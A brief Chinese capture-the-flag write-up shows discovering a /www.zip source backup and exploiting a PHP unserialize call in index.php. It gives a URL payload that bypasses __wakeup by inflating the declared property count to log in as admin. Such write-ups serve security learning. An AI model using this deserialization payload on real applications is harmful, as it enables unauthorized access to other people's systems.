

## 知识点

* [反序列化绕过__wakeup魔术方法](https://www.cnblogs.com/Mrsm1th/p/6835592.html)（**当成员属性数目大于实际数目时可绕过**）

## 解题过程

题目说备份，应该是要下载网站源代码审计。我用的扫描工具是dirsearch（没扫出来）

在扫描工具还没扫出来的时候我乱试了一个/www.zip居然成功了。

代码审计发现index.php有个

``` php
    $select = $_GET['select'];
    $res=unserialize(@$select);
```

应该是个反序列化绕过__wakeup获取到flag

## payload

``` php
/index.php?select=O:4:%22Name%22:3:{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;}
```

